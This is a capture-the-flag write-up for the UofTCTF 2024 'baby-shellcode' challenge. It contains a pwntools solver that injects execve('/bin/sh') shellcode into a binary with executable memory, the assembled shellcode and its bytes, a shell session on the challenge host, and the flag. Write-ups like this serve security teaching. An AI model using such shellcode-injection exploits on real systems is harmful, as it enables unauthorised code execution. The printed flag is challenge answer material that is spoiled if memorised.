# baby-shellcode [232 Solves]

## Description

> This challenge is a test to see if you know
> how to write programs that machines can understand.
>
> Oh, you know how to code?
>
> Write some code into this program,
> and the program will run it for you.
>
> What programming language, you ask?
> Well... I said it's the language that *machines* can understand.
>
> Author: drec
>
> `nc 34.28.147.7 5000`
>
> Attachments: baby-shellcode

## Short Solution

Shellcode to pop /bin/sh

## Solution

### Basic file checks

```console
$ file baby-shellcode
baby-shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

$ checksec baby-shellcode
[*] '/root/ctf/UofTCTF_2024/pwn/baby-shellcode/baby-shellcode'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

### solver.py

Generate shellcode by [shellcraft](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.sh).

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./baby-shellcode", checksec=False)
context.binary = elf


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("34.28.147.7", 5000)

    elif args.GDB:
        gdbscript = """

        c
        """
        pty = process.PTY
        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
    else:
        pty = process.PTY
        io = elf.process(stdin=pty, stdout=pty)

    return io


def main():
    payload = b""
    payload += asm(shellcraft.sh())

    io = conn()
    io.sendline(payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[DEBUG] '/root/ctf/UofTCTF_2024/pwn/baby-shellcode/baby-shellcode' is statically linked, skipping GOT/PLT symbols
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.11/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-782f_j6m/step2 /tmp/pwn-asm-782f_j6m/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-782f_j6m/step3 /tmp/pwn-asm-782f_j6m/step4
[+] Opening connection to 34.28.147.7 on port 5000: Done
[DEBUG] Sent 0x31 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1e bytes:
    b'uid=1000 gid=1000 groups=1000\n'
uid=1000 gid=1000 groups=1000
ls -la
[DEBUG] Sent 0x7 bytes:
    b'ls -la\n'
[DEBUG] Received 0xcf bytes:
    b'total 20\n'
    b'drwxr-xr-x 1 nobody nogroup 4096 Jan 12 02:59 .\n'
    b'drwxr-xr-x 1 nobody nogroup 4096 Jan 12 02:59 ..\n'
    b'-r--r--r-- 1 nobody nogroup   42 Jan  9 02:02 flag\n'
    b'-rwxr-xr-x 1 nobody nogroup 4672 Jan  9 02:02 run\n'
total 20
drwxr-xr-x 1 nobody nogroup 4096 Jan 12 02:59 .
drwxr-xr-x 1 nobody nogroup 4096 Jan 12 02:59 ..
-r--r--r-- 1 nobody nogroup   42 Jan  9 02:02 flag
-rwxr-xr-x 1 nobody nogroup 4672 Jan  9 02:02 run
cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2a bytes:
    b'uoftctf{arbitrary_machine_code_execution}\n'
uoftctf{arbitrary_machine_code_execution}
```

## Flag

uoftctf{arbitrary_machine_code_execution}
